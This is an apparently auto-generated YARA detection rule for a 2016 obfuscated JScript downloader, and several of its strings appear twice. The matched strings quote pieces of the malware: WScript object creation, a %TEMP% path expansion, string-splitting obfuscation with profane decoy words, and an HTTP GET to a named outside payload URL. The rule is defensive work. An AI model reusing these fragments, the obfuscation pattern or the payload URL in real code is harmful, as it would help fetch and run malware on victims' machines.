rule sig_20160428_ca4939e6c65a0ff46705ae501b375002 {
  meta:
    description = "datamaliciousorder - file 20160428_ca4939e6c65a0ff46705ae501b375002.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cc5a555ef4e1446e6cb24bab46bb84bb492d4e985b585ce74f9e9d739e01f1ad"

  strings:
    $s1  = "function KtpYvkSqeXomNtqTkdPpu(QmvEgbLvnUmrXknIcqTbq){KsyWnoGnfGcoNanZypIgo[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function KtpYvkSqeXomNtqTkdPpu(QmvEgbLvnUmrXknIcqTbq){KsyWnoGnfGcoNanZypIgo[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function KjkQmoJaqLzbJtjRpgQay() {return KsyWnoGnfGcoNanZypIgo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return RqsOyrDqwWmhLgdSuzVhm - GraOtuMspAfrAkiYftCed;};" fullword ascii
    $s5  = "function IkcRhaDitRxmOguCwaQyn(RqsOyrDqwWmhLgdSuzVhm, GraOtuMspAfrAkiYftCed){HtsPdkGylYekNkyGrnKqh = HtsPdkGylYekNkyGrnKqh * 1; " ascii
    $s6  = "var KsyWnoGnfGcoNanZypIgo = function RcjInsPllHzvVksAlzMlr() {return PooOptEtjVqfXypRcsVdt[HrgLicUwjLsdAgcBfeZet](\"WScript\"+\"" ascii
    $s7  = "JpyFxhLpmBhySrwIrwGge[DntNizRhdZcxQaoIenLbq](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s8  = "var PooOptEtjVqfXypRcsVdt = this[\"WScript\"];" fullword ascii
    $s9  = "var KsyWnoGnfGcoNanZypIgo = function RcjInsPllHzvVksAlzMlr() {return PooOptEtjVqfXypRcsVdt[HrgLicUwjLsdAgcBfeZet](\"WScript\"+\"" ascii
    $s10 = "function KjkQmoJaqLzbJtjRpgQay() {return KsyWnoGnfGcoNanZypIgo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function IkcRhaDitRxmOguCwaQyn(RqsOyrDqwWmhLgdSuzVhm, GraOtuMspAfrAkiYftCed){HtsPdkGylYekNkyGrnKqh = HtsPdkGylYekNkyGrnKqh * 1; " ascii
    $s12 = "function FlfLenKtlFtuTzhYayFnd(){return IdoNyiYsaSzxMkaIjbLwa + \"\";};" fullword ascii
    $s13 = "if (JpyFxhLpmBhySrwIrwGge[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function FqsVcxNomJhzUvxRtfFav() {return ((ZhtUyqGcuLzdVabYqmXdh == true) && (ZhtUyqGcuLzdVabYqmXdh == QbtWrbKqsZtpMulCvhIfr)) ?" ascii
    $s15 = "function FqsVcxNomJhzUvxRtfFav() {return ((ZhtUyqGcuLzdVabYqmXdh == true) && (ZhtUyqGcuLzdVabYqmXdh == QbtWrbKqsZtpMulCvhIfr)) ?" ascii
    $s16 = "function ZutKfkAgoUwuGgmNcsNps()" fullword ascii
    $s17 = "function RovRfxCtgVecRvvKdnOhj(){return 23;};" fullword ascii
    $s18 = "var VgwKwkPqtBejGalIqdOli = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "}while (JdhTwnZhnRrmLwpGzwIud);" fullword ascii
    $s20 = "var NvnPohDfcDlhVkyNqdBfj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}